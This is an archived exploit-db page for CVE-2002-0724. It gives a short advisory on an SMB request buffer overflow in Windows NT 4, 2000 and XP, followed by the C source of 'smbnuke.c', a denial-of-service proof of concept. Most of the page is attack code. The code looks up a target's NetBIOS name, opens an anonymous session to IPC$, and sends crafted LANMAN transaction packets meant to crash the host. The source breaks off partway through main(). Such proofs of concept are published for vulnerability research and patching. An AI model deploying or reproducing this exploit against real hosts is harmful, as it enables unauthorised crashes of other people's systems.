@@ -1,0 +1,1126 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+		<title>MS Windows 2000/NT 4/XP Network Share Provider SMB Request Buffer Overflow (1)</title>
+		<meta name="description" content="MS Windows 2000/NT 4/XP Network Share Provider SMB Request Buffer Overflow (1)" />
+		<meta name="keywords" content="MS Windows 2000/NT 4/XP Network Share Provider SMB Request Buffer Overflow (1)" />
+		
+		
+					
+		        
+        
+        
+        <link rel="stylesheet" href="http://www.exploit-db.com/wp-content/themes/exploit/js/jquery.fancybox/jquery.fancybox-1.3.1.css" type="text/css" media="screen" />
+        <link type="text/css" rel="stylesheet" href="http://www.exploit-db.com/wp-content/themes/exploit/styles/shCore.css"/>
+        <link type="text/css" rel="stylesheet" href="http://www.exploit-db.com/wp-content/themes/exploit/styles/shThemeDefault.css"/>
+        <link type="text/css" rel="stylesheet" href="http://www.exploit-db.com/wp-content/themes/exploit/styles/jquery.rating.css" />
+        <link type="text/css" rel="stylesheet" href="http://www.exploit-db.com/wp-content/themes/exploit/styles/exploit.css" />
+		<link rel='stylesheet' id='shutter-css'  href='/slider/shutter-reloaded.css?ver=1.3.0' type='text/css' media='screen' />
+		<link type="text/css" rel="stylesheet" href="/wp-content/themes/exploit/digi.css" />
+
+		<style type="text/css">
+		h1 {
+		font-size:22px !important;
+		}
+		.barColor {
+		display:table;
+		clear:both;
+		background-color:#d5d7dd;
+		width:1280px;
+		border:solid #aaa 1px;
+		-webkit-border-radius:5px;
+		-moz-border-radius:5px;
+		border-radius:5px;
+		margin:10px auto 10px auto;
+		}
+		body {
+		background-color:#292929;
+		margin:0px;
+		font-size:14px;
+		}
+		#container {
+		display:block;
+		background-color:#fff;
+		width:1270px;
+		position:relative;
+		left:0px;
+		padding:0 0 0 10px;
+		margin:0 auto -40px auto;
+		/*border:solid #ddd 1px;*/
+		-webkit-border-radius:5px;
+		-moz-border-radius:5px;
+		border-radius:5px;
+		}
+		pre {
+		width:1200px !important;
+		overflow:auto !important;
+		}
+		table {
+		background-color:#f5f5f5;
+		border:solid #aaa 1px;
+		-webkit-border-radius:5px;
+		-moz-border-radius:5px;
+		border-radius:5px;
+		}
+		
+		tr.meta td {font-weight:bold; color:#606060;}
+		table.comment.odd {
+		width:710px;
+		background-color:#f8f8f8;
+		padding:10px;
+		margin:10px;
+		border:solid #ccc 1px;
+		margin-left:auto; margin-right:auto;
+		}
+
+		table.comment.even {
+		width:710px;
+		background-color:#f8f8f8;
+		padding:10px;
+		margin:10px;
+		border:solid #ccc 1px;
+		margin-left:auto; margin-right:auto;
+		}
+		a img {
+		border:none;
+		border-style:none;
+		}
+		#screenshot_upload_form {
+		margin: 0px auto 10px auto;
+		}
+		</style>
+        
+	</head>
+	<body><div style="all:initial;display:block;position:sticky;top:0;z-index:2147483647;background:#0d5c58;color:#fff;font:13px/1.4 system-ui,sans-serif;padding:8px 14px">Archived copy for <a style="color:#f2b134" href="/">fabio.pietrosanti.it</a> · source: <a style="color:#f2b134" href="https://www.exploit-db.com/exploits/21746">www.exploit-db.com/exploits/21746</a> · captured 2012-12-21 · scripts removed</div>
+<div class="barColor">
+		
+	<div id="topAd" style="position:relative; float:right; margin:5px 20px 5px 20px;">
+		
+		
+	</div>
+					<h1 style="position:relative; left:30px;">MS Windows 2000/NT 4/XP Network Share Provider SMB Request Buffer Overflow (1)</h1>
+		
+		<br /><br />
+
+		<table style=" position:relative; left:50px; top:-10px; height:110px; float:left;">
+		
+			<tr>
+			<td style="background-color:#fff; padding:5px;">EDB-ID: <span class="r1">21746</span> </td>
+			<td style="background-color:#fff; padding:5px;">  CVE:  <a rel="nofollow" href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0724" target="_blank">2002-0724</a></td>
+			<td style="background-color:#fff; padding:5px;">OSVDB-ID: <a rel="nofollow" href="http://osvdb.org/show/osvdb/2074" target="_blank">2074</a></td>
+			</tr>
+				
+			<tr>
+			<td style="background-color:#fff; padding:5px;">Author: Frederic Deletang</td>
+			<td style="background-color:#fff; padding:5px;">Published: 2002-08-22</td>
+			<td style="background-color:#fff; padding:5px;">Verified: <img src="http://www.exploit-db.com/images/accept.png" alt="Verified" /></td>
+			</tr>
+			
+			<tr>
+			<td style="background-color:#fff; padding:5px;">Exploit Code: &nbsp;&nbsp;<a href="/download/21746"><img src="/images/46.png" style="position:relative; top:5px;" alt="Download" title="Download" border="0" /></a></td>
+			<td style="background-color:#fff; padding:5px;">Vulnerable App: &nbsp;&nbsp;N/A</td>
+			<td style="background-color:#fff; padding:5px;">
+			
+			
+			
+			</td>
+			</tr>
+		</table>
+		
+		<table style="position:relative; top:-10px; height:110px;  float:left; margin-left:60px;">
+		<tr><td style="background-color:#fff; margin:5px;">
+		<div id="rating2">
+			
+			<h2 style="margin-bottom:0px; font-size:14px;">Rating</h2>
+			<form action="" method="post">
+				<label>Overall:</label>
+				<input name="rate" type="radio" class="star total-rating" value="1" />
+				<input name="rate" type="radio" class="star total-rating" value="2" />
+				<input name="rate" type="radio" class="star total-rating" value="3" />
+				<input name="rate" type="radio" class="star total-rating" value="4" />
+				<input name="rate" type="radio" class="star total-rating" value="5" />
+				<span class="num_value">
+					(0.0)				</span>
+			</form>
+			<div class="clear"></div>
+							<!-- 
+				<p><a href="http://www.exploit-db.com/?page_id=1321?redirect_to=http://www.exploit-db.com/exploits/21746">Login</a>/<a href="">Register</a> to be able to rate exploits</p>
+				 -->
+						
+		</div> <!--end of #rating-->
+		
+		</td></tr></table>
+		
+		<div style="display:table; table-layout:fixed; width:700px; float:left; margin-left:30px;">
+		
+				
+			<a style="text-decoration:none; color:#000;" href="http://www.exploit-db.com/exploits/21745/"><img src="http://www.exploit-db.com/images/prev.png" alt="Prev" style="border:none; border-style:none;" /></a>
+						
+			 <a style="text-decoration:none; color:#000;" href="http://www.exploit-db.com"><img src="http://www.exploit-db.com/images/back.png" alt="Home" style="border:none; border-style:none;" /></a>
+			
+						<a style="text-decoration:none; color:#000;" href="http://www.exploit-db.com/exploits/21747/"><img src="http://www.exploit-db.com/images/next.png" alt="Next" style="border:none; border-style:none;" /></a>
+					</div>
+
+</div><!--// top color //-->
+		
+
+		 		
+		<div id="container">
+			<pre class="brush: c;gutter:false;auto-links: false;;">source: http://www.securityfocus.com/bid/5556/info
+
+Microsoft Windows operating systems use the Server Message Block (SMB) protocol to support services such as file and printer sharing. A buffer overflow vulnerability has been reporting in the handling of some malformed SMB requests.
+
+An attacker may send a malformed SMB request packet in order to exploit this condition. It has been reported possible to corrupt heap memory, leading to a crash of the underlying system.
+
+It may prove possible to exploit this vulnerability to execute arbitrary code and gain local access to the vulnerable system. This possibility has not, however, been confirmed.
+
+Reportedly, this vulnerability may be exploited both as an authenticated user, and with anonymous access to the service.
+
+It has been reported, by &quot;Fabio Pietrosanti \(naif\)&quot; &lt;naif@blackhats.it&gt;, that disabling the NetBIOS Null Session will prevent exploitation of this vulnerablity. 
+
+/*
+ *   smbnuke.c -- Windows SMB Nuker (DoS) - Proof of concept
+ *   Copyright (C) 2002  Frederic Deletang (df@phear.org)
+ *
+ *   This program is free software; you can redistribute it and/or
+ *   modify it under the terms of the GNU General Public License
+ *   as published by the Free Software Foundation; either version 2 of
+ *   the License or (at your option) any later version.
+ *
+ *   This program is distributed in the hope that it will be
+ *   useful, but WITHOUT ANY WARRANTY; without even the implied warranty
+ *   of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ *   GNU General Public License for more details.
+ *
+ *   You should have received a copy of the GNU General Public License
+ *   along with this program; if not, write to the Free Software
+ *   Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
+ *   USA
+ */
+
+/* NOTE:
+ * Compile this program using only GCC and no other compilers
+ * (except if you think this one supports the __attribute__ (( packed )) attribute)
+ * This program might not work on big-endian systems.
+ * It has been successfully tested from the following plateforms:
+ * 	- Linux 2.4.18 / i686
+ * 	- FreeBSD 4.6.1-RELEASE-p10 / i386
+ * Don't bother me if you can't get it to compile or work on Solaris using the SunWS compiler.
+ *
+ * Another thing: The word counts are hardcoded, careful if you hack the sources.
+ */
+
+/* Copyright notice:
+ * some parts of this source (only two functions, name_len and name_mangle)
+ * has been taken from libsmb.  The rest, especially the structures has
+ * been written by me.
+ */
+
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netdb.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;ctype.h&gt;
+#include &lt;assert.h&gt;
+#include &lt;string.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;time.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/time.h&gt;
+
+#define SESSION_REQUEST 0x81
+
+#define SESSION_MESSAGE 0x00
+
+#define SMB_NEGOTIATE_PROTOCOL 0x72
+#define SMB_SESSION_SETUP_ANDX 0x73
+#define SMB_TREE_CONNECT_ANDX 0x75
+#define SMB_COM_TRANSACTION 0x25
+
+#define bswap16(x) \
+	((((x) &gt;&gt; 8) &amp; 0xff) | (((x) &amp; 0xff) &lt;&lt; 8))
+
+typedef struct
+{
+  unsigned char server_component[4];
+  unsigned char command;
+  unsigned char error_class;
+  unsigned char reserved1;
+  uint16_t error_code;
+  uint8_t flags;
+  uint16_t flags2;
+  unsigned char reserved2[12];
+  uint16_t tree_id;
+  uint16_t proc_id;
+  uint16_t user_id;
+  uint16_t mpex_id;
+}
+__attribute__ ((packed)) smb_header;
+
+typedef struct
+{
+  unsigned char type;
+  unsigned char flags;
+  unsigned short length;
+  unsigned char called[34];
+  unsigned char calling[34];
+}
+__attribute__ ((packed)) nbt_packet;
+
+typedef struct
+{
+  /* wct: word count */
+  uint8_t wct;
+  unsigned char andx_command;
+  unsigned char reserved1;
+  uint16_t andx_offset;
+  uint16_t max_buffer;
+  uint16_t max_mpx_count;
+  uint16_t vc_number;
+  uint32_t session_key;
+  uint16_t ANSI_pwlen;
+  uint16_t UNI_pwlen;
+  unsigned char reserved2[4];
+  uint32_t capabilities;
+  /* bcc: byte count */
+  uint16_t bcc;
+}
+__attribute__ ((packed)) session_setup_andx_request;
+
+typedef struct
+{
+  /* wct: word count */
+  uint8_t wct;
+  unsigned char andx_command;
+  unsigned char reserved1;
+  uint16_t andx_offset;
+  uint16_t flags;
+  uint16_t pwlen;
+  uint16_t bcc;
+}
+__attribute__ ((packed)) tree_connect_andx_request;
+
+typedef struct
+{
+  /* wct: word count */
+  uint8_t wct;
+  uint16_t total_param_cnt;
+  uint16_t total_data_cnt;
+  uint16_t max_param_cnt;
+  uint16_t max_data_cnt;
+  uint8_t max_setup_cnt;
+  unsigned char reserved1;
+  uint16_t flags;
+  uint32_t timeout;
+  uint16_t reserved2;
+  uint16_t param_cnt;
+  uint16_t param_offset;
+  uint16_t data_cnt;
+  uint16_t data_offset;
+  uint8_t setup_count;
+  uint8_t reserved3;
+  /* bcc: byte count */
+  uint16_t bcc;
+}
+__attribute__ ((packed)) transaction_request;
+
+typedef struct
+{
+  uint16_t function_code;
+  unsigned char param_descriptor[6];
+  unsigned char return_descriptor[7];
+  uint16_t detail_level;
+  uint16_t recv_buffer_len;
+}
+__attribute__ ((packed)) parameters;
+
+
+typedef struct
+{
+  uint8_t format;
+  unsigned char *name;
+}
+t_dialects;
+
+t_dialects dialects[] = {
+  {2, &quot;PC NETWORK PROGRAM 1.0&quot;},
+  {2, &quot;MICROSOFT NETWORKS 1.03&quot;},
+  {2, &quot;MICROSOFT NETWORKS 3.0&quot;},
+  {2, &quot;LANMAN1.0&quot;},
+  {2, &quot;LM1.2X002&quot;},
+  {2, &quot;Samba&quot;},
+  {2, &quot;NT LM 0.12&quot;},
+  {2, &quot;NT LANMAN 1.0&quot;},
+  {0, NULL}
+};
+
+enum
+{
+  STATE_REQUESTING_SESSION_SETUP = 1,
+  STATE_NEGOTIATING_PROTOCOL,
+  STATE_REQUESTING_SESSION_SETUP_ANDX,
+  STATE_REQUESTING_TREE_CONNECT_ANDX,
+  STATE_REQUESTING_TRANSACTION
+}
+status;
+
+const unsigned char *global_scope = NULL;
+
+/****************************************************************************
+ * return the total storage length of a mangled name - from smbclient
+ *
+ ****************************************************************************/
+
+int
+name_len (char *s1)
+{
+  /* NOTE: this argument _must_ be unsigned */
+  unsigned char *s = (unsigned char *) s1;
+  int len;
+
+  /* If the two high bits of the byte are set, return 2. */
+  if (0xC0 == (*s &amp; 0xC0))
+    return (2);
+
+  /* Add up the length bytes. */
+  for (len = 1; (*s); s += (*s) + 1)
+    {
+      len += *s + 1;
+      assert (len &lt; 80);
+    }
+
+  return (len);
+}                               /* name_len */
+
+
+/****************************************************************************
+ * mangle a name into netbios format - from smbclient 
+ *  Note:  &lt;Out&gt; must be (33 + strlen(scope) + 2) bytes long, at minimum.
+ *
+ ****************************************************************************/
+
+int
+name_mangle (char *In, char *Out, char name_type)
+{
+  int i;
+  int c;
+  int len;
+  char buf[20];
+  char *p = Out;
+
+  /* Safely copy the input string, In, into buf[]. */
+  (void) memset (buf, 0, 20);
+  if (strcmp (In, &quot;*&quot;) == 0)
+    buf[0] = '*';
+  else
+    (void) snprintf (buf, sizeof (buf) - 1, &quot;%-15.15s%c&quot;, In, name_type);
+
+  /* Place the length of the first field into the output buffer. */
+  p[0] = 32;
+  p++;
+
+  /* Now convert the name to the rfc1001/1002 format. */
+  for (i = 0; i &lt; 16; i++)
+    {
+      c = toupper (buf[i]);
+      p[i * 2] = ((c &gt;&gt; 4) &amp; 0x000F) + 'A';
+      p[(i * 2) + 1] = (c &amp; 0x000F) + 'A';
+    }
+  p += 32;
+  p[0] = '\0';
+
+  /* Add the scope string. */
+  for (i = 0, len = 0; NULL != global_scope; i++, len++)
+    {
+      switch (global_scope[i])
+        {
+        case '\0':
+          p[0] = len;
+          if (len &gt; 0)
+            p[len + 1] = 0;
+          return (name_len (Out));
+        case '.':
+          p[0] = len;
+          p += (len + 1);
+          len = -1;
+          break;
+        default:
+          p[len + 1] = global_scope[i];
+          break;
+        }
+    }
+
+  return (name_len (Out));
+
+}
+
+int
+tcp_connect (const char *rhost, unsigned short port)
+{
+  struct sockaddr_in dest;
+  struct hostent *host;
+  int fd;
+
+  host = gethostbyname (rhost);
+  if (host == NULL)
+    {
+      fprintf (stderr, &quot;Could not resolve host: %s\n&quot;, rhost);
+      return -1;
+    }
+
+  dest.sin_family = AF_INET;
+  dest.sin_addr.s_addr = *(long *) (host-&gt;h_addr);
+  dest.sin_port = htons (port);
+
+  fd = socket (AF_INET, SOCK_STREAM, 0);
+
+  if (connect (fd, (struct sockaddr *) &amp;dest, sizeof (dest)) &lt; 0)
+    {
+      fprintf (stderr, &quot;Could not connect to %s:%d - %s\n&quot;, rhost, port,
+               strerror (errno));
+      return -1;
+    }
+
+  return fd;
+}
+
+void
+build_smb_header (smb_header * hdr, uint8_t command, uint8_t flags,
+                  uint16_t flags2, uint16_t tree_id, uint16_t proc_id,
+                  uint16_t user_id, uint16_t mpex_id)
+{
+  memset (hdr, 0, sizeof (smb_header));
+
+  /* SMB Header MAGIC. */
+  hdr-&gt;server_component[0] = 0xff;
+  hdr-&gt;server_component[1] = 'S';
+  hdr-&gt;server_component[2] = 'M';
+  hdr-&gt;server_component[3] = 'B';
+
+  hdr-&gt;command = command;
+
+  hdr-&gt;flags = flags;
+  hdr-&gt;flags2 = flags2;
+
+  hdr-&gt;tree_id = tree_id;
+  hdr-&gt;proc_id = proc_id;
+  hdr-&gt;user_id = user_id;
+  hdr-&gt;mpex_id = mpex_id;
+}
+
+unsigned char *
+push_string (unsigned char *stack, unsigned char *string)
+{
+  strcpy (stack, string);
+  return stack + strlen (stack) + 1;
+}
+
+void
+request_session_setup (int fd, char *netbios_name)
+{
+  nbt_packet pkt;
+
+  pkt.type = SESSION_REQUEST;
+  pkt.flags = 0x00;
+  pkt.length = bswap16 (sizeof (nbt_packet));
+  name_mangle (netbios_name, pkt.called, 0x20);
+  name_mangle (&quot;&quot;, pkt.calling, 0x00);
+  write (fd, &amp;pkt, sizeof (nbt_packet));
+
+}
+
+void
+negotiate_protocol (unsigned char *buffer, int fd)
+{
+  smb_header hdr;
+  unsigned char *p;
+  uint16_t proc_id, mpex_id;
+  int i;
+
+  proc_id = (uint16_t) rand ();
+  mpex_id = (uint16_t) rand ();
+
+  buffer[0] = SESSION_MESSAGE;
+  buffer[1] = 0x0;
+
+  build_smb_header (&amp;hdr, SMB_NEGOTIATE_PROTOCOL, 0, 0, 0, proc_id, 0,
+                    mpex_id);
+
+  memcpy (buffer + 4, &amp;hdr, sizeof (smb_header));
+
+  p = buffer + 4 + sizeof (smb_header) + 3;
+
+  for (i = 0; dialects[i].name != NULL; i++)
+    {
+      *p = dialects[i].format;
+      strcpy (p + 1, dialects[i].name);
+      p += strlen (dialects[i].name) + 2;
+    }
+
+  /* Set the word count */
+  *(uint8_t *) (buffer + 4 + sizeof (smb_header)) = 0;
+
+  /* Set the byte count */
+  *(uint16_t *) (buffer + 4 + sizeof (smb_header) + 1) =
+    (uint16_t) (p - buffer - 4 - sizeof (smb_header) - 3);
+
+  *(uint16_t *) (buffer + 2) = bswap16 ((uint16_t) (p - buffer - 4));
+
+  write (fd, buffer, p - buffer);
+
+}
+
+void
+request_session_setup_andx (unsigned char *buffer, int fd)
+{
+  smb_header hdr;
+  session_setup_andx_request ssar;
+  uint16_t proc_id, mpex_id;
+  unsigned char *p;
+
+  proc_id = (uint16_t) rand ();
+  mpex_id = (uint16_t) rand ();
+
+  build_smb_header (&amp;hdr, SMB_SESSION_SETUP_ANDX, 0x08, 0x0001, 0, proc_id, 0,
+                    mpex_id);
+
+  buffer[0] = SESSION_MESSAGE;
+  buffer[1] = 0x0;
+
+  memcpy (buffer + 4, &amp;hdr, sizeof (smb_header));
+
+  p = buffer + 4 + sizeof (smb_header);
+
+  memset (&amp;ssar, 0, sizeof (session_setup_andx_request));
+  ssar.wct = 13;
+  ssar.andx_command = 0xff;     /* No further commands */
+  ssar.max_buffer = 65535;
+  ssar.max_mpx_count = 2;
+  ssar.vc_number = 1025;
+
+  ssar.ANSI_pwlen = 1;
+
+  p = buffer + 4 + sizeof (smb_header) + sizeof (session_setup_andx_request);
+
+  /* Ansi password */
+  p = push_string (p, &quot;&quot;);
+
+  /* Account */
+  p = push_string (p, &quot;&quot;);
+
+  /* Primary domain */
+  p = push_string (p, &quot;WORKGROUP&quot;);
+
+  /* Native OS */
+  p = push_string (p, &quot;Unix&quot;);
+
+  /* Native Lan Manager */
+  p = push_string (p, &quot;Samba&quot;);
+
+  ssar.bcc =
+    p - buffer - 4 - sizeof (smb_header) -
+    sizeof (session_setup_andx_request);
+
+  memcpy (buffer + 4 + sizeof (smb_header), &amp;ssar,
+          sizeof (session_setup_andx_request));
+
+  /* Another byte count */
+  *(uint16_t *) (buffer + 2) =
+    bswap16 ((uint16_t)
+             (sizeof (session_setup_andx_request) + sizeof (smb_header) +
+              ssar.bcc));
+
+  write (fd, buffer,
+         sizeof (session_setup_andx_request) + sizeof (smb_header) + 4 +
+         ssar.bcc);
+}
+
+void
+request_tree_connect_andx (unsigned char *buffer, int fd,
+                           const char *netbios_name)
+{
+  smb_header hdr;
+  tree_connect_andx_request tcar;
+  uint16_t proc_id, user_id;
+  unsigned char *p, *q;
+
+  proc_id = (uint16_t) rand ();
+  user_id = ((smb_header *) (buffer + 4))-&gt;user_id;
+
+  build_smb_header (&amp;hdr, SMB_TREE_CONNECT_ANDX, 0x18, 0x2001, 0, proc_id,
+                    user_id, 0);
+
+  buffer[0] = SESSION_MESSAGE;
+  buffer[1] = 0x0;
+
+  memcpy (buffer + 4, &amp;hdr, sizeof (smb_header));
+
+  memset (&amp;tcar, 0, sizeof (tree_connect_andx_request));
+
+  tcar.wct = 4;
+  tcar.andx_command = 0xff;     /* No further commands */
+  tcar.pwlen = 1;
+
+  p = buffer + 4 + sizeof (smb_header) + sizeof (tree_connect_andx_request);
+
+  /* Password */
+  p = push_string (p, &quot;&quot;);
+
+  /* Path */
+  q = malloc (8 + strlen (netbios_name));
+
+  sprintf (q, &quot;\\\\%s\\IPC$&quot;, netbios_name);
+  p = push_string (p, q);
+
+  free (q);
+
+  /* Service */
+  p = push_string (p, &quot;IPC&quot;);
+
+  tcar.bcc =
+    p - buffer - 4 - sizeof (smb_header) - sizeof (tree_connect_andx_request);
+
+  memcpy (buffer + 4 + sizeof (smb_header), &amp;tcar,
+          sizeof (tree_connect_andx_request));
+
+  /* Another byte count */
+  *(uint16_t *) (buffer + 2) =
+    bswap16 ((uint16_t)
+             (sizeof (tree_connect_andx_request) + sizeof (smb_header) +
+              tcar.bcc));
+
+  write (fd, buffer,
+         sizeof (tree_connect_andx_request) + sizeof (smb_header) + 4 +
+         tcar.bcc);
+}
+
+void
+request_transaction (unsigned char *buffer, int fd)
+{
+  smb_header hdr;
+  transaction_request transaction;
+  parameters params;
+  uint16_t proc_id, tree_id, user_id;
+  unsigned char *p;
+
+  proc_id = (uint16_t) rand ();
+  tree_id = ((smb_header *) (buffer + 4))-&gt;tree_id;
+  user_id = ((smb_header *) (buffer + 4))-&gt;user_id;
+
+  build_smb_header (&amp;hdr, SMB_COM_TRANSACTION, 0, 0, tree_id, proc_id,
+                    user_id, 0);
+
+  buffer[0] = SESSION_MESSAGE;
+  buffer[1] = 0x0;
+
+  memcpy (buffer + 4, &amp;hdr, sizeof (smb_header));
+
+  memset (&amp;transaction, 0, sizeof (transaction_request));
+
+  transaction.wct = 14;
+  transaction.total_param_cnt = 19; /* Total lenght of parameters */
+  transaction.param_cnt = 19; /* Lenght of parameter */
+
+  p = buffer + 4 + sizeof (smb_header) + sizeof (transaction_request);
+
+  /* Transaction name */
+  p = push_string (p, &quot;\\PIPE\\LANMAN&quot;);
+
+  transaction.param_offset = p - buffer - 4;
+
+  params.function_code = (uint16_t) 0x68;       /* NetServerEnum2 */
+  strcpy (params.param_descriptor, &quot;WrLeh&quot;);    /* RAP_NetGroupEnum_REQ  */
+  strcpy (params.return_descriptor, &quot;B13BWz&quot;);  /* RAP_SHARE_INFO_L1 */
+  params.detail_level = 1;
+  params.recv_buffer_len = 50000;
+
+  memcpy (p, &amp;params, sizeof (parameters));
+
+  p += transaction.param_cnt;
+
+  transaction.data_offset = p - buffer - 4;
+
+  transaction.bcc =
+    p - buffer - 4 - sizeof (smb_header) - sizeof (transaction_request);
+
+  memcpy (buffer + 4 + sizeof (smb_header), &amp;transaction,
+          sizeof (transaction_request));
+
+  /* Another byte count */
+  *(uint16_t *) (buffer + 2) =
+    bswap16 ((uint16_t)
+             (sizeof (transaction_request) + sizeof (smb_header) +
+              transaction.bcc));
+
+  write (fd, buffer,
+         sizeof (transaction_request) + sizeof (smb_header) + 4 +
+         transaction.bcc);
+}
+
+typedef struct
+{
+  uint16_t transaction_id;
+  uint16_t flags;
+  uint16_t questions;
+  uint16_t answerRRs;
+  uint16_t authorityRRs;
+  uint16_t additionalRRs;
+
+  unsigned char query[32];
+  uint16_t name;
+  uint16_t type;
+  uint16_t class;
+}
+__attribute__ ((packed)) nbt_name_query;
+
+typedef struct
+{
+  nbt_name_query answer;
+  uint32_t ttl;
+  uint16_t datalen;
+  uint8_t names;
+}
+__attribute__ ((packed)) nbt_name_query_answer;
+
+char *
+list_netbios_names (unsigned char *buffer, size_t size, const char *rhost,
+                    unsigned short port, unsigned int timeout)
+{
+  nbt_name_query query;
+  struct sockaddr_in dest;
+  struct hostent *host;
+  int fd, i;
+
+  fd_set rfds;
+  struct timeval tv;
+
+  printf (&quot;Trying to list netbios names on %s\n&quot;, rhost);
+
+  host = gethostbyname (rhost);
+  if (host == NULL)
+    {
+      fprintf (stderr, &quot;Could not resolve host: %s\n&quot;, rhost);
+      return NULL;
+    }
+
+  memset (&amp;dest, 0, sizeof (struct sockaddr_in));
+
+  dest.sin_family = AF_INET;
+  dest.sin_addr.s_addr = *(long *) (host-&gt;h_addr);
+  dest.sin_port = htons (port);
+
+  if ((fd = socket (AF_INET, SOCK_DGRAM, 0)) &lt; 0)
+    {
+      fprintf (stderr, &quot;Could not setup the UDP socket: %s\n&quot;,
+               strerror (errno));
+      return NULL;
+    }
+
+  memset (&amp;query, 0, sizeof (nbt_name_query));
+
+  query.transaction_id = (uint16_t) bswap16 (0x1e);     //rand();
+  query.flags = bswap16 (0x0010);
+  query.questions = bswap16 (1);
+
+  name_mangle (&quot;*&quot;, query.query, 0);
+  query.type = bswap16 (0x21);
+  query.class = bswap16 (0x01);
+
+  if (sendto
+      (fd, &amp;query, sizeof (nbt_name_query), 0, (struct sockaddr *) &amp;dest,
+       sizeof (struct sockaddr_in)) != sizeof (nbt_name_query))
+    {
+      fprintf (stderr, &quot;Could not send UDP packet: %s\n&quot;, strerror (errno));
+      return NULL;
+    }
+
+  /* Now, wait for an answer -- add a timeout to 10 seconds */
+
+  FD_ZERO (&amp;rfds);
+  FD_SET (fd, &amp;rfds);
+
+  tv.tv_sec = timeout;
+  tv.tv_usec = 0;
+
+  if (!select (fd + 1, &amp;rfds, NULL, NULL, &amp;tv))
+    {
+      fprintf (stderr,
+               &quot;The udp read has reached the timeout - try setting the netbios name manually - exiting...\n&quot;);
+      return NULL;
+    }
+
+  recvfrom (fd, buffer, size, 0, NULL, NULL);
+
+  for (i = 0; i &lt; ((nbt_name_query_answer *) buffer)-&gt;names; i++)
+    if ((uint8_t) * (buffer + sizeof (nbt_name_query_answer) + 18 * i + 15) ==
+        0x20)
+      return buffer + sizeof (nbt_name_query_answer) + 18 * i;
+
+  printf (&quot;No netbios name available for use - you probably won't be able to crash this host\n&quot;);
+  printf (&quot;However, you can try setting one manually\n&quot;);
+  
+  return NULL;
+}
+
+char *
+extract_name (const char *name)
+{
+  int i;
+  char *p = malloc(14);
+
+  for (i = 0; i &lt; 14; i++)
+    if (name[i] == ' ')
+      break;
+     else
+      p[i] = name[i];
+
+  p[i] = '\0';
+
+  return p;
+}
+
+void
+print_banner (void)
+{
+  printf (&quot;Windows SMB Nuker (DoS) - Proof of concept - CVE CAN-2002-0724\n&quot;);
+  printf (&quot;Copyright 2002 - Frederic Deletang (df@phear.org) - 28/08/2002\n\n&quot;);
+}
+
+int
+is_smb_header (const unsigned char *buffer, int len)
+{
+  if (len &lt; sizeof (smb_header))
+    return 0;
+
+  if (buffer[0] == 0xff &amp;&amp; buffer[1] == 'S' &amp;&amp; buffer[2] == 'M'
+      &amp;&amp; buffer[3] == 'B')
+    return 1;
+  else
+    return 0;
+}
+
+int
+main (int argc, char **argv)
+{
+  int fd, r, i, c;
+  unsigned char buffer[1024 * 4];       /* Enough. */
+  char *hostname = NULL, *name = NULL;
+
+  unsigned int showhelp = 0;
+
+  unsigned int packets = 10;
+  unsigned int state;
+
+  unsigned int udp_timeout = 10;
+  unsigned int tcp_timeout = 10;
+
+  unsigned short netbios_ssn_port = 139;
+  unsigned short netbios_ns_port = 137;
+
+  fd_set rfds;
+  struct timeval tv;
+
+  srand (time (NULL));
+
+  print_banner ();
+
+  while ((c = getopt (argc, argv, &quot;N:n:p:P:t:T:h&quot;)) != -1)
+    {
+      switch (c)
+        {
+        case 'N':
+          name = optarg;
+          break;
+        case 'n':
+          packets = atoi (optarg);
+          break;
+        case 'p':
+          netbios_ns_port = atoi (optarg);
+          break;
+        case 'P':
+          netbios_ssn_port = atoi (optarg);
+          break;
+        case 't':
+          udp_timeout = atoi (optarg);
+          break;
+        case 'T':
+          tcp_timeout = atoi (optarg);
+          break;
+        case 'h':
+        default:
+          showhelp = 1;
+          break;
+        }
+    }
+
+  if (optind &lt; argc)
+	  hostname = argv[optind++];
+  
+  if (showhelp || hostname == NULL)
+    {
+      printf (&quot;Usage: %s [options] hostname/ip...\n&quot;, argv[0]);
+      printf
+        (&quot;   -N [netbios-name]         Netbios Name (default: ask the remote host)\n&quot;);
+      printf
+        (&quot;   -n [packets]              Number of crafted packets to send (default: %d)\n&quot;,
+         packets);
+      printf
+        (&quot;   -p [netbios-ns port]      UDP Port to query (default: %d)\n&quot;,
+         netbios_ns_port);
+      printf
+        (&quot;   -P [netbios-ssn port]     TCP Port to query (default: %d)\n&quot;,
+         netbios_ssn_port);
+      printf
+        (&quot;   -t [udp-timeout]          Timeout to wait for receive on UDP ports (default: %d)\n&quot;,
+         udp_timeout);
+      printf
+        (&quot;   -T [tcp-timeout]          Timeout to wait for receive on TCP ports (default: %d\n&quot;,
+         tcp_timeout);
+      printf (&quot;\n&quot;);
+      printf (&quot;Known vulnerable systems: \n&quot;);
+      printf (&quot;    - Windows NT 4.0 Workstation/Server\n&quot;);
+      printf (&quot;    - Windows 2000 Professional/Advanced Server\n&quot;);
+      printf (&quot;    - Windows XP Professional/Home edition\n\n&quot;);
+      exit (1);
+    }
+
+  if (!name
+      &amp;&amp; (name =
+          list_netbios_names (buffer, sizeof (buffer), hostname,
+                              netbios_ns_port, udp_timeout)) == NULL)
+    exit (1);
+  else
+    name = extract_name (name);
+
+  printf (&quot;Using netbios name: %s\n&quot;, name);
+
+  printf (&quot;Connecting to remote host (%s:%d)...\n&quot;, hostname,
+          netbios_ssn_port);
+
+  fd = tcp_connect (hostname, netbios_ssn_port);
+
+  if (fd == -1)
+    exit (1);
+
+
+  FD_ZERO (&amp;rfds);
+  FD_SET (fd, &amp;rfds);
+
+  tv.tv_sec = tcp_timeout;
